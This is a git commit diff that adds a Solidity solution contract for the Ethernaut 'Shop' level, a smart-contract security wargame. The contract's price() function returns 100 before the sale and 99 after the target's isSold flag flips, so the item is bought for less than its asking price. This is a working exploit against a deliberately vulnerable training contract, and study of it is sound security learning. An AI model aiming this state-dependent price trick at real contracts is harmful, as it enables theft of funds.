17eef41785b61748c92fd64c454fce5794c12c2a
Daniel Boye <danielboye888@gmail.com>
2024-02-22 21:19:33 +0100

    update to shop

--- ethernaut/21-Shop/ShopSolve.sol
+++ ethernaut/21-Shop/ShopSolve.sol
@@ -1,6 +1,26 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+contract Solve {
+  Shop private immutable target;
+
+  constructor(address _target) {
+    target = Shop(_target);
+  }
+
+  function hack() external {
+    target.buy();
+    require(target.price() == 99, "price != 99");
+  }
+
+  function price() external view returns (uint) {
+    if (target.isSold()) {
+      return 99;
+    }
+    return 100;
+  }
+}
+
 interface Buyer {
   function price() external view returns (uint);
 }
